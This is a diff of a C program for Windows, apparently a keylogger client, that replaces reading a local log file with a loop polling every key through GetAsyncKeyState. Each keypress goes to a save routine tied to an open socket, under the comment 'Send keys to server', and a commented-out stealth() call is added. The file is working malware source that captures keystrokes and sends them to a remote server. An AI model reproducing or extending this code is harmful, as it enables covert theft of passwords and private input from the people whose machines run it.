@@ -1,10 +1,10 @@
-#include <winsock2.h>
-#include "debug.h"
+#include "funcs.h"
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
 //flag -lws2_32
 
 int main(int argc , char *argv[])
 {
+    // stealth();
     //Variables
     WSADATA data;
     SOCKET sock;
@@ -14,9 +14,8 @@ int main(int argc , char *argv[])
 
     //Get and check argv
     int doDebug = 0;
-    const char* true = "true";
     if(argc != 2) debug(1, 0, "[-]Too many or too short argumets! (client.exe [<boolean> debug])", -1);
-    if(strcmp(argv[1], true) == 0) doDebug = 1;
+    if(strcmp(argv[1], "true") == 0) doDebug = 1;
 
     //Initialize Winsock
     if (WSAStartup(MAKEWORD(2,2),&data) != 0)
@@ -38,20 +37,18 @@ int main(int argc , char *argv[])
     debug(doDebug, 0, "[-]Error in connect().", WSAGetLastError());
     else debug(doDebug, 1, "[+]Connected succesfully to the server.\n", 0);
 
-    //TODO
-    char buf[100];
-    FILE* log = fopen("../../logger/bin/logs/log.txt", "a+");
-    if(log == NULL)
-    debug(doDebug, 0, "[-]File can't be opened.", -1);
-    else debug(doDebug, 1, "[+]log.txt opened correctly\n", 0);
+    //Send keys to server
+    char buf[20];
+    memset(buf, 0, sizeof(buf));
 
-    while (fgets(buf, 100, log) != NULL);
-
-    if(send(sock, buf, sizeof(buf), 0) == SOCKET_ERROR)
-    debug(doDebug, 0, "[-]Error in send().", WSAGetLastError());
-    else debug(doDebug, 1, "[+]Data sent succesfully to the server.\n", 0);
-
-    fclose(log);
+    while(1)
+    {
+        for(int key = 0; key < 191; key++)
+        {
+            if(GetAsyncKeyState(key) == -32767) save(key, buf, doDebug, sock);
+            memset(buf, 0, sizeof(buf));
+        }
+    }
 
     //Close the socket
     if(closesocket(sock) == INVALID_SOCKET)
